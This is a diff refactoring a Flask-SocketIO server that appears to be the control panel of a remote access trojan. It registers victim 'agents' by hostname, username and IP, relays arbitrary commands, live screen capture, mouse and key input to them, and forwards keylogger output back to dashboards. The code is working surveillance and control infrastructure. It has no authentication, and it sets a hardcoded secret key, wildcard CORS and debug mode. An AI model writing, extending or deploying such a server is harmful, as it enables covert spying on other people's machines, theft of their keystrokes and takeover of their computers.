@@ -1,127 +1,136 @@
 from flask import Flask, render_template, request, jsonify
-from flask_socketio import SocketIO, emit, join_room, leave_room
+from flask_socketio import SocketIO, emit, join_room
 from datetime import datetime
-import uuid, os
+import uuid
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'changeme123'
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=16*1024*1024)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
-clients = {}
-agent_sids = {}
-viewer_watching = {}
+clients = {}          # client_id -> info dict
+agent_sids = {}       # client_id -> socket sid
+dashboard_sids = set()
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/api/ping', methods=['POST'])
-def ping():
-    data = request.json or {}
-    client_id = data.get('client_id', str(uuid.uuid4()))
-    clients[client_id] = {
-        'id': client_id, 'hostname': data.get('hostname','Unknown'),
-        'ip': request.remote_addr, 'username': data.get('username','Unknown'),
-        'platform': data.get('platform','Unknown'),
-        'connected_at': data.get('connected_at', datetime.now().isoformat()),
-        'last_seen': datetime.now().isoformat(), 'status': 'online'
-    }
-    socketio.emit('client_update', {'clients': list(clients.values())})
-    return jsonify({'status':'ok','client_id':client_id})
+# ── Agent events ─────────────────────────────────────────────
 
 @socketio.on('connect')
 def handle_connect():
-    emit('client_update', {'clients': list(clients.values())})
-
-@socketio.on('request_clients')
-def handle_request():
-    emit('client_update', {'clients': list(clients.values())})
-
-@socketio.on('agent_register')
-def agent_register(data):
-    client_id = data.get('client_id')
-    if not client_id: return
-    agent_sids[client_id] = request.sid
-    join_room(f'agent_{client_id}')
-    existing = clients.get(client_id, {})
-    clients[client_id] = {
-        'id': client_id,
-        'hostname': data.get('hostname', existing.get('hostname','Unknown')),
-        'ip': request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR','Unknown')),
-        'username': data.get('username', existing.get('username','Unknown')),
-        'platform': data.get('platform', existing.get('platform','Unknown')),
-        'connected_at': existing.get('connected_at', data.get('connected_at', datetime.now().isoformat())),
-        'last_seen': datetime.now().isoformat(), 'status': 'online'
-    }
-    socketio.emit('client_update', {'clients': list(clients.values())})
+    pass
 
 @socketio.on('disconnect')
 def handle_disconnect():
     sid = request.sid
-    for cid, asid in list(agent_sids.items()):
-        if asid == sid:
-            del agent_sids[cid]
+    # Check if this was an agent
+    for cid, csid in list(agent_sids.items()):
+        if csid == sid:
             if cid in clients:
                 clients[cid]['status'] = 'offline'
-                clients[cid]['last_seen'] = datetime.now().isoformat()
-            socketio.emit('client_update', {'clients': list(clients.values())})
+            del agent_sids[cid]
+            broadcast_clients()
             break
-    viewer_watching.pop(sid, None)
+    dashboard_sids.discard(sid)
 
-@socketio.on('viewer_watch')
-def viewer_watch(data):
-    client_id = data.get('client_id')
-    viewer_watching[request.sid] = client_id
-    join_room(f'viewers_{client_id}')
-    if client_id in agent_sids:
-        socketio.emit('start_stream', {}, room=f'agent_{client_id}')
+@socketio.on('agent_register')
+def handle_agent_register(data):
+    cid = data.get('client_id', str(uuid.uuid4()))
+    agent_sids[cid] = request.sid
+    join_room(f'agent_{cid}')
+    clients[cid] = {
+        'id': cid,
+        'hostname': data.get('hostname', 'Unknown'),
+        'ip': request.remote_addr,
+        'username': data.get('username', 'Unknown'),
+        'platform': data.get('platform', 'Unknown'),
+        'connected_at': data.get('connected_at', datetime.now().isoformat()),
+        'last_seen': datetime.now().isoformat(),
+        'status': 'online',
+        'sid': request.sid,
+    }
+    broadcast_clients()
 
-@socketio.on('viewer_unwatch')
-def viewer_unwatch(data):
-    client_id = data.get('client_id')
-    viewer_watching.pop(request.sid, None)
-    if client_id:
-        leave_room(f'viewers_{client_id}')
-        socketio.emit('stop_stream', {}, room=f'agent_{client_id}')
+@socketio.on('dashboard_join')
+def handle_dashboard_join():
+    dashboard_sids.add(request.sid)
+    join_room('dashboards')
+    emit('client_update', {'clients': sanitized_clients()})
 
-@socketio.on('screen_frame')
-def screen_frame(data):
-    client_id = data.get('client_id')
-    socketio.emit('screen_frame', {'frame': data.get('frame'), 'client_id': client_id}, room=f'viewers_{client_id}')
+@socketio.on('request_clients')
+def handle_request_clients():
+    emit('client_update', {'clients': sanitized_clients()})
+
+# ── Dashboard -> Agent relay ──────────────────────────────────
+
+@socketio.on('cmd')
+def handle_cmd(data):
+    """Dashboard sends cmd, relay to specific agent."""
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('cmd', data, to=agent_sids[cid])
+    else:
+        emit('cmd_response', {'client_id': cid, 'rid': data.get('rid',''), 'status': 'error', 'msg': 'Agent not connected'})
+
+@socketio.on('start_stream')
+def handle_start_stream(data):
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('start_stream', data, to=agent_sids[cid])
+
+@socketio.on('stop_stream')
+def handle_stop_stream(data):
+    cid = data.get('client_id')
+    if cid and cid in agent_sids:
+        socketio.emit('stop_stream', data, to=agent_sids[cid])
 
 @socketio.on('mouse_move')
-def mouse_move(data):
+def handle_mouse_move(data):
     cid = data.get('client_id')
-    if cid in agent_sids: socketio.emit('mouse_move', {'x':data['x'],'y':data['y']}, room=f'agent_{cid}')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_move', data, to=agent_sids[cid])
 
 @socketio.on('mouse_click')
-def mouse_click(data):
+def handle_mouse_click(data):
     cid = data.get('client_id')
-    if cid in agent_sids: socketio.emit('mouse_click', {'x':data['x'],'y':data['y'],'button':data.get('button','left')}, room=f'agent_{cid}')
+    if cid and cid in agent_sids:
+        socketio.emit('mouse_click', data, to=agent_sids[cid])
 
 @socketio.on('key_press')
-def key_press(data):
+def handle_key_press(data):
     cid = data.get('client_id')
-    if cid in agent_sids: socketio.emit('key_press', {'key':data['key']}, room=f'agent_{cid}')
+    if cid and cid in agent_sids:
+        socketio.emit('key_press', data, to=agent_sids[cid])
 
-# ── Feature commands (dashboard -> agent) ──
-@socketio.on('cmd')
-def cmd(data):
+# ── Agent -> Dashboard relay ──────────────────────────────────
+
+@socketio.on('screen_frame')
+def handle_screen_frame(data):
+    """Agent sends frame, relay to all dashboards."""
     cid = data.get('client_id')
-    if cid in agent_sids: socketio.emit('cmd', data, room=f'agent_{cid}')
+    if cid in clients:
+        clients[cid]['last_seen'] = datetime.now().isoformat()
+    socketio.emit('screen_frame', data, to='dashboards')
 
-# ── Feature responses (agent -> dashboard) ──
-@socketio.on('cmd_response')
-def cmd_response(data):
-    cid = data.get('client_id')
-    socketio.emit('cmd_response', data, room=f'viewers_{cid}')
-
-# Keylog data streamed back
 @socketio.on('keylog_data')
-def keylog_data(data):
+def handle_keylog_data(data):
+    socketio.emit('keylog_data', data, to='dashboards')
+
+@socketio.on('cmd_response')
+def handle_cmd_response(data):
     cid = data.get('client_id')
-    socketio.emit('keylog_data', data, room=f'viewers_{cid}')
+    if cid in clients:
+        clients[cid]['last_seen'] = datetime.now().isoformat()
+    socketio.emit('cmd_response', data, to='dashboards')
+
+# ── Helpers ───────────────────────────────────────────────────
+
+def sanitized_clients():
+    return [{k: v for k, v in c.items() if k != 'sid'} for c in clients.values()]
+
+def broadcast_clients():
+    socketio.emit('client_update', {'clients': sanitized_clients()}, to='dashboards')
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
